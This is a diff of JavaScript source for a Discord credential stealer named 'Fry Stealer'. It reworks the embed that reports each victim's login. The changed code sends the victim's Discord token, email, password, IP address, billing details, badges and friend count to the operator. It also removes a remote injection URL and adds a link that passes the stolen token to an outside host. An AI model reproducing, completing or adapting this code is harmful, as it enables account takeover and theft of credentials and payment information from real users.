@@ -14,7 +14,6 @@ const config = {
   embed_name: 'Fry Stealer', 
   embed_icon: 'https://wallpaperspeed.id/gallery/wallpaper/20220427/draw-you-an-anime-profile-picture-by-rinruru-fiverr,how-to-make-anime-profile-picture-preview.webp',
   embed_color: 0x8400ff, 
-  injection_url: 'https://raw.githubusercontent.com/diazzdrugs/diazz.github.io/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
@@ -610,60 +609,50 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: 'Victim info',
-            value: `\`\`\`IP:  \n${config.ip}\n\`\`\``,
+            name: '<a:944007295417843743:959785231982931979> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: 'Username',
-            value: `\`${json.username}\``,
-            inline: false,
-          },
-          {
-            name: 'ID',
-            value: `\`${json.id}\``,
+            name: '<a:satanist:802503618972483615> Badges:',
+            value: `${badges}`,
             inline: true,
           },
-          { 
-            name: '<a:badges:990780871516770374> Badges',
-            value: `${badges}`,
-            inline: false,
-          },
           {
-            name: 'Billing',
+            name: '<:944007233820307467:959785232037470208> Billing:',
             value: `**${billing}**`,
             inline: true,
           },
           {
-            name: 'Friends Total',
+            name: '<:944007233820307467:959785232037470208> Friends:',
             value: `\`${friends}\``,
-            inline: false,
+            inline: true,
           },
           {
-            name: 'Email',
+            name: '<:944007233820307467:959785232037470208> Email:',
             value: `\`${email}\``,
-            inline: false,
+            inline: true,
           },
           {
-            name: 'Password',
+            name: '<:944007233820307467:959785232037470208> IP:',
+            value: `\`${config.ip}\``,
+            inline: true,
+          },
+          {
+            name: '<a:satan:846706207632261120> Password:',
             value: `\`${password}\``,
-            inline: false,
+            inline: true,
           },
-          {
-            name: 'Token',
-            value: ` ````${token}```` `,
-            inline: false,
-          }
         ],
         author: {
-          name: 'User Login',
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Frystealer',
+          text: 'BulkFA',
         },
         thumbnail: {
-          url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
         },
       },
     ],
